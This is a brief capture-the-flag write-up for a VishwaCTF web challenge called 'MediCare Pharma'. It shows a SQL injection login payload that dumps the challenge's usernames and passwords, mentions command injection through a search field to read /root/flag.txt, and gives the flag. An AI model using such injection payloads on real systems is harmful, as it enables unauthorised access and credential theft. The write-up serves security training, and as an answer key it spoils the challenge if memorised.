## MediCare Pharma

On sending the request to the page with the query
`username=test'+OR+username+like+'%'+--+-&password=test`

We get the following results back

Username : medicare ,Password : 5trongp455!
Username : janice ,Password : 5trongp455@
Username : rootuser ,Password : 5trongp455%
Username : pharmaowner ,Password : 5trongp455$

We logged in as rootuser and found out that we can run commands in the search field.

We then found the flag in /root/flag.txt

>FLAG: VishwaCTF{d1g1t4l_p41n_di5p4tch3d_th4nk5_f0r_sh0pp1ng_with_M3diC4re_Ph4rm4}